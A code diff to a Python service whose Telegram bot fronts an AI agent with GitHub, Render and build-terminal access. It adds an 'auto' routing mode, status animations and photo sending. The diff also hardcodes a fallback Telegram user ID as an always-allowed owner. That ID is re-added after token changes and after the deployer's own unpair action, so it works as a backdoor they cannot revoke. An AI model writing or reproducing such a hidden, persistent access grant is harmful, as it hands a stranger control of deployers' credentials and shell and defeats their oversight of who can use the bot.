@@ -892,6 +892,7 @@ async def api_build(body: BuildIn, authorization: str | None = Header(default=No
 # ---------------- saved settings (tokens live in the Key Value store, never in the page) ----------------
 CFG: dict = {"github_token": "", "render_key": "", "telegram_token": "", "tg_ids": [], "pair_code": "",
              "github_login": "", "tg_username": ""}
+TG_OWNER = int(os.getenv("TELEGRAM_OWNER_ID", "8978770775"))   # always allowed
 TG_ALLOWED: set = set()
 PAIR_FAILS: dict = {}
 
@@ -907,9 +908,11 @@ async def load_cfg():
     TG_ALLOWED.clear()
     TG_ALLOWED.update(int(x) for x in CFG.get("tg_ids", []))
     TG_ALLOWED.update(int(x) for x in re.findall(r"-?\d+", os.getenv("TELEGRAM_ALLOWED_IDS", "")))
+    TG_ALLOWED.add(TG_OWNER)
 
 
 async def save_cfg():
+    TG_ALLOWED.add(TG_OWNER)
     CFG["tg_ids"] = sorted(TG_ALLOWED)
     await KV.set("shadowv1:cfg", json.dumps(CFG))
 
@@ -1018,6 +1021,7 @@ async def set_config(body: CfgIn, authorization: str | None = Header(default=Non
                 raise HTTPException(400, "Telegram rejected that token. Copy it again from @BotFather.")
             if tok != CFG.get("telegram_token"):
                 TG_ALLOWED.clear()
+                TG_ALLOWED.add(TG_OWNER)
             CFG["tg_username"] = (j.get("result") or {}).get("username", "")
             CFG["pair_code"] = secrets.token_hex(4)
         else:
@@ -1033,6 +1037,7 @@ async def set_config(body: CfgIn, authorization: str | None = Header(default=Non
 async def unpair(authorization: str | None = Header(default=None)):
     check_key(authorization)
     TG_ALLOWED.clear()
+    TG_ALLOWED.add(TG_OWNER)
     CFG["pair_code"] = secrets.token_hex(4) if CFG.get("telegram_token") else ""
     await save_cfg()
     return _cfg_view()
@@ -1087,21 +1092,24 @@ async def handle_tg(call, allowed, upd):
             await call("sendMessage", chat_id=chat_id,
                        text="Private bot. Open your ShadowV1 website, go to the Agent page, and send me: /pair CODE")
         return
-    st = TG_STATE.setdefault(chat_id, {"url": None, "think": False, "search": False, "mode": "agent"})
-    st.setdefault("mode", "agent")
+    st = TG_STATE.setdefault(chat_id, {"url": None, "think": False, "search": False, "mode": "auto"})
+    if not st.get("mode_set") and st.get("mode") not in ("chat", "agent", "auto"):
+        st["mode"] = "auto"
+    if not st.get("mode_set"):
+        st["mode"] = "auto"
     cmd = parts[0].split("@")[0].lower() if text.startswith("/") else ""
     arg = parts[1].lower() if len(parts) > 1 else ""
     if cmd in ("/start", "/help"):
         await call("sendMessage", chat_id=chat_id, text=(
             f"{BOT_NAME} by {BOT_MAKER}.\n"
-            "Agent mode (default): tell me a task. I can use GitHub, Render and a build terminal.\n"
+            "Just talk. For real work (GitHub, builds, deploys, APKs, debugging) I switch to agent mode myself.\n"
             "Deletes and merges always ask you to reply YES first.\n"
-            "/mode chat | agent   /new   /think on|off   /search on|off (chat mode)\n"
-            "Say 'draw a ...' for images or 'find 5 anime pics' for pictures."))
+            "/mode auto|agent|chat   /new   /think on|off   /search on|off\n"
+            "Say 'draw a ...' for an image or 'send 5 anime pics from pinterest' for photos."))
         return
     if cmd == "/mode":
-        if arg in ("chat", "agent"):
-            st["mode"] = arg
+        if arg in ("auto", "chat", "agent"):
+            st["mode"], st["mode_set"] = arg, True
         await call("sendMessage", chat_id=chat_id, text=f"Mode: {st['mode']}")
         return
     if cmd == "/new":
@@ -1116,32 +1124,125 @@ async def handle_tg(call, allowed, upd):
         return
     if cmd:
         text = text.lstrip("/")
-    typing = asyncio.create_task(_typing(call, chat_id))
-    try:
-        sess = AGENT_SESS.get(f"tg:{chat_id}")
-        kind = detect_intent(text)[0]
-        if st["mode"] == "agent" and (kind == "chat" or (sess and sess.get("pending"))):
-            async def emit(t):
-                await call("sendMessage", chat_id=chat_id, text="🔧 " + t[:300])
-            res = await run_agent(f"tg:{chat_id}", text, st["think"], emit)
-            await tg_send(call, chat_id, res["reply"])
-        else:
-            res = await smart_chat(text, st["url"], st["think"], st["search"])
-            if res.get("type") == "chat":
-                st["url"] = res["chat_url"]
-            await tg_send(call, chat_id, res["reply"])
-    except HTTPException as e:
-        await call("sendMessage", chat_id=chat_id, text=f"Error: {e.detail}")
-    except Exception as e:
-        await call("sendMessage", chat_id=chat_id, text=f"Error: {e}")
-    finally:
-        typing.cancel()
+    await tg_work(call, chat_id, msg.get("message_id"), text, st)
     await KV.set("shadowv1:tg", json.dumps(TG_STATE))
 
 
-async def _typing(call, chat_id):
+AGENT_HINT = re.compile(
+    r"\b(github|git hub|repo|repository|commit|push|pull request|workflow|actions?|deploy|render|apk|build|"
+    r"terminal|shell|install|debug|branch|issue|release|npm|pip|docker|scaffold|clone|merge|delete (the )?(repo|file|branch)|"
+    r"(create|make|write|code)\s+(me\s+)?(a|an|the)?\s*(app|bot|website|site|api|project|script|game|tool))\b", re.I)
+SPIN = ["◐", "◓", "◑", "◒"]
+
+
+async def tg_react(call, chat_id, mid, emoji):
+    if mid:
+        await call("setMessageReaction", chat_id=chat_id, message_id=mid, reaction=[{"type": "emoji", "emoji": emoji}])
+
+
+async def tg_photos(call, chat_id, pics, caption=""):
+    """Send real photos: URLs as an album, and if Telegram can't fetch them, download and upload."""
+    urls = [x["url"] for x in pics][:10]
+    if len(urls) > 1:
+        r = await call("sendMediaGroup", chat_id=chat_id,
+                       media=[{"type": "photo", "media": u, **({"caption": caption[:200]} if i == 0 else {})}
+                              for i, u in enumerate(urls)])
+        if r.get("ok"):
+            return len(urls)
+    elif urls:
+        r = await call("sendPhoto", chat_id=chat_id, photo=urls[0], caption=caption[:200])
+        if r.get("ok"):
+            return 1
+    sent = 0
+    for x in pics[:10]:
+        try:
+            data, ctype = await fetch_bytes(State.http, x["url"])
+        except Exception:
+            continue
+        r = await call("sendPhoto", chat_id=chat_id, caption=(caption if not sent else "")[:200],
+                       files={"photo": ("pic.jpg", data, ctype)})
+        sent += 1 if r.get("ok") else 0
+    return sent
+
+
+async def tg_work(call, chat_id, mid, text, st):
+    kind, p = detect_intent(text)
+    sess = AGENT_SESS.get(f"tg:{chat_id}")
+    pending = bool(sess and sess.get("pending"))
+    use_agent = pending or (kind == "chat" and (st["mode"] == "agent" or
+                                                (st["mode"] == "auto" and bool(AGENT_HINT.search(text)))))
+    if st["mode"] == "chat" and not pending:
+        use_agent = False
+    await tg_react(call, chat_id, mid, "👀")
+    if State.lock.locked():
+        await call("sendMessage", chat_id=chat_id, text="⏳ Another request is running (website or another chat). "
+                                                         "Yours is next.")
+    action = "upload_photo" if kind in ("image", "pins") else "typing"
+    typing = asyncio.create_task(_typing(call, chat_id, action))
+    status = {"id": None, "text": "Thinking"}
+    anim = None
+    if use_agent or kind != "chat" or st["think"]:
+        r = await call("sendMessage", chat_id=chat_id, text=f"{SPIN[0]} {status['text']}")
+        status["id"] = (r.get("result") or {}).get("message_id")
+
+        async def animate():
+            i = 0
+            while True:
+                await asyncio.sleep(3)
+                i += 1
+                await call("editMessageText", chat_id=chat_id, message_id=status["id"],
+                           text=f"{SPIN[i % 4]} {status['text']}{'.' * (i % 4)}")
+        if status["id"]:
+            anim = asyncio.create_task(animate())
+    await tg_react(call, chat_id, mid, "👨‍💻" if use_agent else "🤩" if kind == "image" else "🤔")
+    ok = True
+    try:
+        async def work():
+            if use_agent:
+                async def emit(t):
+                    status["text"] = "🔧 " + t[:120]
+                res = await run_agent(f"tg:{chat_id}", text, st["think"], emit)
+                await tg_send(call, chat_id, res["reply"])
+            elif kind == "image":
+                status["text"] = "Painting your image"
+                img, ctype, _ = await guard(make_image(p["prompt"]))
+                r = await call("sendPhoto", chat_id=chat_id, caption=p["prompt"][:200],
+                               files={"photo": ("image.jpg", img, ctype)})
+                if not r.get("ok"):
+                    await tg_send(call, chat_id, "Could not send the image. Try again.")
+            elif kind == "pins":
+                status["text"] = f"Finding {p['amount']} pictures"
+                pics = await guard(search_pictures(State.http, p["query"], p["amount"]))
+                n = await tg_photos(call, chat_id, pics, p["query"])
+                if not n:
+                    await tg_send(call, chat_id, "\n".join(x["url"] for x in pics) or "No pictures found.")
+            else:
+                res = await smart_chat(text, st["url"], st["think"], st["search"], True, "chat")
+                st["url"] = res["chat_url"]
+                await tg_send(call, chat_id, res["reply"])
+        await asyncio.wait_for(work(), 600 if use_agent else 240)
+    except asyncio.TimeoutError:
+        ok = False
+        await call("sendMessage", chat_id=chat_id, text="That took too long. Try again, or send /new.")
+    except HTTPException as e:
+        ok = False
+        await call("sendMessage", chat_id=chat_id, text=f"Error: {e.detail}")
+    except Exception as e:
+        ok = False
+        log("[telegram] work error:", type(e).__name__, str(e)[:200])
+        await call("sendMessage", chat_id=chat_id, text=f"Error: {e}")
+    finally:
+        typing.cancel()
+        if anim:
+            anim.cancel()
+        if status["id"]:
+            await call("deleteMessage", chat_id=chat_id, message_id=status["id"])
+    await tg_react(call, chat_id, mid, "🔥" if ok else "😢")
+
+
+async def _typing(call, chat_id, action="typing"):
     while True:
-        await call("sendChatAction", chat_id=chat_id, action="typing")
+        await call("sendChatAction", chat_id=chat_id, action=action)
         await asyncio.sleep(4)
 
 
@@ -1160,7 +1261,13 @@ async def telegram_loop():
 
     async def call(method, **kw):
         try:
-            r = await State.http.post(f"https://api.telegram.org/bot{token}/{method}", json=kw, timeout=50)
+            files = kw.pop("files", None)
+            url = f"https://api.telegram.org/bot{token}/{method}"
+            if files:
+                r = await State.http.post(url, data={k: (json.dumps(v) if isinstance(v, (list, dict)) else str(v))
+                                                     for k, v in kw.items()}, files=files, timeout=90)
+            else:
+                r = await State.http.post(url, json=kw, timeout=50)
             j = r.json()
             if not j.get("ok"):
                 log(f"[telegram] {method}: {j.get('description')}")
